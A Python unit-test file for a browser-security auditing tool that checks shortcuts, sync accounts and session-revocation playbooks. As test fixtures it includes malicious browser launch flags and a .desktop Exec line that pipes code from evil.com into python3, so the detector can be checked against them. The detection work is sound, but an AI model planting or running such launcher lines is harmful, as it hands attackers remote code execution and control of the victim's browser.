"""Pruebas unitarias para las mejoras de CookieGuard v1.7.0.

- Auditoría de accesos directos e inicio (.lnk y .desktop)
- Auditoría de sincronización de perfiles y cuentas conectadas
- Playbooks interactivos de revocación de sesiones (HTML y Markdown)
"""
from __future__ import annotations

import json
import struct
import tempfile
import unittest
from pathlib import Path

from cookieguard.browsers import Profile
from cookieguard.common import VERSION
from cookieguard.shortcuts_audit import (
    analyze_shortcut,
    audit_shortcuts,
    parse_desktop_file,
    parse_lnk_arguments,
)
from cookieguard.sync_audit import (
    audit_all_profiles_sync,
    audit_chromium_sync,
    audit_firefox_sync,
    mask_email,
)
from cookieguard.playbooks import (
    PLAYBOOK_CATALOG,
    generate_playbook_html,
    generate_playbook_markdown,
    match_services_for_cookies,
)


def _build_test_lnk(args: str = "", target: str = "C:\\Program Files\\Google\\Chrome\\chrome.exe", is_unicode: bool = True) -> bytes:
    """Construye un archivo LNK sintético mínimo según MS-SHLLINK."""
    header_size = 76
    clsid = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    flags = 0
    if args:
        flags |= 0x20  # HasArguments
    if is_unicode:
        flags |= 0x80  # IsUnicode

    header = struct.pack("<I", header_size) + clsid + struct.pack("<I", flags) + b"\x00" * (76 - 24)
    data = bytearray(header)

    if args:
        raw_str = args.encode("utf-16-le" if is_unicode else "latin-1", errors="replace")
        data.extend(struct.pack("<H", len(args)))
        data.extend(raw_str)

    return bytes(data)


class TestShortcutsAudit(unittest.TestCase):
    def test_parse_lnk_clean_and_malicious(self):
        mal_args = "--load-extension=C:\\bad\\ext --proxy-server=10.0.0.1:8080"
        lnk_bytes = _build_test_lnk(mal_args)
        _, parsed_args = parse_lnk_arguments(lnk_bytes)
        self.assertEqual(parsed_args, mal_args)

    def test_analyze_shortcut_lnk_detection(self):
        with tempfile.TemporaryDirectory() as td:
            td_path = Path(td)
            mal_lnk = td_path / "Google Chrome.lnk"
            mal_args = "--load-extension=C:\\malicious\\payload --disable-web-security"
            mal_lnk.write_bytes(_build_test_lnk(mal_args))

            res = analyze_shortcut(mal_lnk)
            self.assertIsNotNone(res)
            self.assertEqual(res["estado"], "alerta")
            self.assertTrue(len(res["hallazgos"]) >= 2)
            hallazgos_str = " ".join(h["descripcion"] for h in res["hallazgos"])
            self.assertIn("load-extension", hallazgos_str)
            self.assertIn("disable-web-security", hallazgos_str)

    def test_analyze_shortcut_desktop_linux(self):
        with tempfile.TemporaryDirectory() as td:
            td_path = Path(td)
            clean_desktop = td_path / "google-chrome.desktop"
            clean_desktop.write_text("""[Desktop Entry]
Name=Google Chrome
Exec=/usr/bin/google-chrome-stable %U
Type=Application
""", encoding="utf-8")

            res_clean = analyze_shortcut(clean_desktop)
            self.assertIsNotNone(res_clean)
            self.assertEqual(res_clean["estado"], "ok")
            self.assertEqual(len(res_clean["hallazgos"]), 0)

            mal_desktop = td_path / "evil-firefox.desktop"
            mal_desktop.write_text("""[Desktop Entry]
Name=Firefox Web Browser
Exec=bash -c "curl http://evil.com/p | python3" firefox %U
Type=Application
""", encoding="utf-8")

            res_mal = analyze_shortcut(mal_desktop)
            self.assertIsNotNone(res_mal)
            self.assertEqual(res_mal["estado"], "alerta")
            hallazgos_str = " ".join(h["descripcion"] for h in res_mal["hallazgos"])
            self.assertTrue("curl" in hallazgos_str or "bash" in hallazgos_str)

    def test_audit_shortcuts_scan(self):
        with tempfile.TemporaryDirectory() as td:
            td_path = Path(td)
            f = td_path / "Edge.lnk"
            f.write_bytes(_build_test_lnk("--proxy-server=socks5://1.2.3.4:9050"))

            audit = audit_shortcuts([td_path])
            self.assertEqual(audit["total_analizados"], 1)
            self.assertEqual(audit["total_alertas"], 1)
            self.assertEqual(audit["estado_general"], "alerta")


class TestSyncAudit(unittest.TestCase):
    def test_mask_email(self):
        self.assertEqual(mask_email("miguel@outlook.es"), "m****l@outlook.es")
        self.assertEqual(mask_email("al@domain.com"), "a*@domain.com")
        self.assertEqual(mask_email("invalid"), "invalid")

    def test_audit_chromium_sync(self):
        with tempfile.TemporaryDirectory() as td:
            pdir = Path(td)
            pref = pdir / "Preferences"
            pref.write_text(json.dumps({
                "account_info": [
                    {"email": "victima@empresa.com", "gaia_id": "112233445566", "hosted_domain": "empresa.com"}
                ],
                "sync": {
                    "has_setup_completed": True,
                    "sync_everything": True
                }
            }), encoding="utf-8")

            prof = Profile(
                browser="Chrome",
                family="chromium",
                profile="Default",
                path=pdir,
                cookies_db=None,
                root=pdir.parent
            )

            res = audit_chromium_sync(prof, anonymize=True)
            self.assertTrue(res["sync_activo"])
            self.assertEqual(len(res["cuentas"]), 1)
            self.assertIn("v*****a@empresa.com", res["cuentas"][0]["email"])
            self.assertTrue(any("sync_everything" in h for h in res["hallazgos"]))

    def test_audit_firefox_sync(self):
        with tempfile.TemporaryDirectory() as td:
            pdir = Path(td)
            user_f = pdir / "signedInUser.json"
            user_f.write_text(json.dumps({
                "email": "user@mozilla.org",
                "uid": "123456",
                "verified": True
            }), encoding="utf-8")

            prof = Profile(
                browser="Firefox",
                family="firefox",
                profile="profile.default",
                path=pdir,
                cookies_db=None,
                root=pdir.parent
            )

            res = audit_firefox_sync(prof, anonymize=False)
            self.assertTrue(res["sync_activo"])
            self.assertEqual(res["cuentas"][0]["email"], "user@mozilla.org")


class TestPlaybooks(unittest.TestCase):
    def test_catalog_structure(self):
        self.assertGreaterEqual(len(PLAYBOOK_CATALOG), 15)
        for item in PLAYBOOK_CATALOG:
            self.assertIn("id", item)
            self.assertIn("nombre", item)
            self.assertIn("url_sesiones", item)
            self.assertIn("pasos", item)
            self.assertTrue(item["url_sesiones"].startswith("http"))

    def test_match_services(self):
        mock_sessions = [
            {"nombre": "Google Accounts", "dominio": ".google.com", "total_cookies": 5},
            {"nombre": "GitHub", "dominio": "github.com", "total_cookies": 2}
        ]
        matched = match_services_for_cookies(mock_sessions)
        ids = [m["id"] for m in matched]
        self.assertIn("google", ids)
        self.assertIn("github", ids)

    def test_generate_playbook_html(self):
        with tempfile.TemporaryDirectory() as td:
            out_file = Path(td) / "test_checklist.html"
            gen = generate_playbook_html(output_path=out_file)
            self.assertTrue(gen.is_file())
            content = gen.read_text(encoding="utf-8")
            self.assertIn("localStorage", content)
            self.assertIn("CookieGuard: Playbook de Revocación", content)
            self.assertIn("Google / Gmail", content)

    def test_generate_playbook_markdown(self):
        with tempfile.TemporaryDirectory() as td:
            out_file = Path(td) / "test_playbook.md"
            gen = generate_playbook_markdown(output_path=out_file)
            self.assertTrue(gen.is_file())
            content = gen.read_text(encoding="utf-8")
            self.assertIn("# 🚨 CookieGuard: Playbook de Respuesta", content)
            self.assertIn("Consola de Sesiones Activas", content)


class TestVersionConsistency(unittest.TestCase):
    def test_version_170(self):
        self.assertIn(VERSION, ("1.7.0", "1.8.0", "1.9.0", "2.0.0", "2.1.0", "2.2.0", "2.3.0", "2.4.0", "2.4.1"))


if __name__ == "__main__":
    unittest.main()
